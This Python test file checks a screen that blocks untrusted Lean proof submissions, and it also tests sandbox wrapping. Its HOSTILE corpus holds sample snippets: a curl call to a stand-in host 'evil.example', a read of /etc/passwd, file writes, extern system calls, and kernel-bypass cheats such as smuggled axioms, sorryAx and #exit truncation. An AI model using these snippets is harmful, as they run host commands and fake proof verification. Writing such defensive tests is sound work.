"""Hostile-proof corpus for the untrusted-source policy screen.

Every entry in HOSTILE must be BLOCKED before Lean ever runs; every entry in
CLEAN must pass. Pure Python — no Lean toolchain needed — so this runs in CI
on every release (the release gate's "catches what it claims" check).
"""

import os

import pytest

from core import sandbox
from core.proof_policy import POLICY_VERSION, blocking, screen_source, theorem_names
from core.prover import iterative_proof_search

HOSTILE = {
    # host execution at elaboration time
    "eval_io": (
        'import Mathlib\n#eval IO.Process.run { cmd := "curl", args := #["evil.example"] }\n'
        "theorem t : True := trivial"
    ),
    "eval_bang": '#eval! (IO.FS.readFile "/etc/passwd")\ntheorem t : True := trivial',
    "run_cmd": 'run_cmd Lean.logInfo "hi"\ntheorem t : True := trivial',
    "run_meta": "run_meta pure ()\ntheorem t : True := trivial",
    "initialize": 'initialize IO.println "boot"\ntheorem t : True := trivial',
    "builtin_initialize": "builtin_initialize pure ()\ntheorem t : True := trivial",
    "io_in_def": 'def leak : IO Unit := IO.FS.writeFile "/tmp/x" "y"\ntheorem t : True := trivial',
    "system_call": 'def f := System.FilePath.mk "/"\ntheorem t : True := trivial',
    "extern": '@[extern "system"] opaque sys : String → UInt32\ntheorem t : True := trivial',
    "unsafe_def": "unsafe def cast' (a : α) : β := unsafeCast a\ntheorem t : True := trivial",
    "exit_truncates": "theorem ok : True := trivial\n#exit\ntheorem never_checked : 1 = 2 := rfl",
    # metaprogramming that can disguise a statement
    "macro": 'macro "trust_me" : tactic => `(tactic| exact False.elim (by assumption))\ntheorem t : True := trivial',
    "elab": 'elab "evil" : tactic => pure ()\ntheorem t : True := trivial',
    "syntax": 'syntax "cheat" : tactic\ntheorem t : True := trivial',
    "notation": 'notation "⊤⊤" => True\ntheorem t : ⊤⊤ := trivial',
    "import_meta": "import Lean.Elab.Command\ntheorem t : True := trivial",
    "import_lean": "import Lean\ntheorem t : True := trivial",
    # kernel bypass / cheats
    "skip_kernel": "set_option debug.skipKernelTC true\ntheorem one_eq_two : (1 : Nat) = 2 := sorry",
    "debug_option": "set_option debug.byAsSorry true\ntheorem t : True := trivial",
    "native_decide": "theorem big : 2^64 > 1 := by native_decide",
    "of_reduce_bool": "theorem t : True := Lean.ofReduceBool _ _ rfl ▸ trivial",
    "sorry_ax": "theorem t : (1 : Nat) = 2 := sorryAx _ false",
    "axiom_decl": "axiom sneaky : False\ntheorem one_eq_two : (1 : Nat) = 2 := False.elim sneaky",
    "protected_axiom": "protected axiom sneaky : False\ntheorem x : False := sneaky",
    "private_theorem": "private theorem hidden : (1 : Nat) = 1 := rfl",
}

CLEAN = {
    "basic": "theorem add_zero' (n : Nat) : n + 0 = n := by simp",
    "mathlib": "import Mathlib\n\ntheorem two_le (n : ℕ) (h : 2 ≤ n) : 1 ≤ n := by omega",
    "comment_mentions": (
        "-- this file does not #eval anything, and IO.println is only mentioned\n"
        "/- run_cmd in a comment is fine -/\ntheorem t : True := trivial"
    ),
    "namespaced": "namespace Foo\n@[simp] theorem bar : True := trivial\nend Foo",
    "house_import": "import AxiomCode.Spec\ntheorem t : True := trivial",
}


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_hostile_corpus_is_blocked(name):
    assert blocking(screen_source(HOSTILE[name])), f"{name} slipped through the policy screen"


@pytest.mark.parametrize("name", sorted(CLEAN))
def test_clean_corpus_passes(name):
    assert not blocking(screen_source(CLEAN[name])), screen_source(CLEAN[name])


def test_findings_carry_line_numbers():
    f = blocking(screen_source("theorem ok : True := trivial\n\n#eval 1"))
    assert f and f[0].line == 3 and f[0].rule == "exec.eval"


def test_policy_version_is_stamped():
    assert POLICY_VERSION and POLICY_VERSION[:4].isdigit()


def test_attributed_theorems_reach_the_axiom_audit():
    # The old line regex missed these, so a smuggled-axiom theorem carrying
    # an attribute escaped `#print axioms` entirely.
    code = (
        "namespace N\n"
        "@[simp] theorem a : True := trivial\n"
        "protected theorem b : True := trivial\n"
        "noncomputable section\n"
        "@[simp, norm_cast] lemma c : True := trivial\n"
        "end\n"
        "end N\n"
        "theorem d : True := trivial\n"
    )
    assert theorem_names(code) == ["N.a", "N.b", "N.c", "d"]


def test_prover_refuses_blocked_source_without_elaborating(tmp_path):
    calls = []

    def writer(code):
        calls.append(code)
        p = tmp_path / "V.lean"
        p.write_text(code)
        return p

    verified, _code, attempts, log = iterative_proof_search(
        writer, tmp_path, HOSTILE["eval_io"], None, "none", max_attempts=3, use_pantograph=False
    )
    assert verified is False
    assert attempts == 0
    assert calls == [], "a blocked submission must never be written for elaboration"
    assert log.startswith("POLICY_BLOCKED")


def test_sandbox_required_mode_fails_closed(monkeypatch, tmp_path):
    monkeypatch.setenv(sandbox.MODE_ENV, "required")
    monkeypatch.setattr(sandbox.shutil, "which", lambda _name: None)
    with pytest.raises(sandbox.SandboxUnavailableError):
        sandbox.wrap(["lake", "env", "lean", "V.lean"], tmp_path)


def test_sandbox_wraps_with_no_network_when_available(monkeypatch, tmp_path):
    if not os.sys.platform.startswith("linux"):
        pytest.skip("bubblewrap is Linux-only")
    monkeypatch.setenv(sandbox.MODE_ENV, "required")
    monkeypatch.setattr(sandbox.shutil, "which", lambda _name: "/usr/bin/bwrap")
    cmd, note = sandbox.wrap(["lake", "env", "lean", "V.lean"], tmp_path)
    assert cmd[0] == "/usr/bin/bwrap" and "--unshare-all" in cmd and "--ro-bind" in cmd
    assert cmd[-4:] == ["lake", "env", "lean", "V.lean"]
    assert "no network" in note
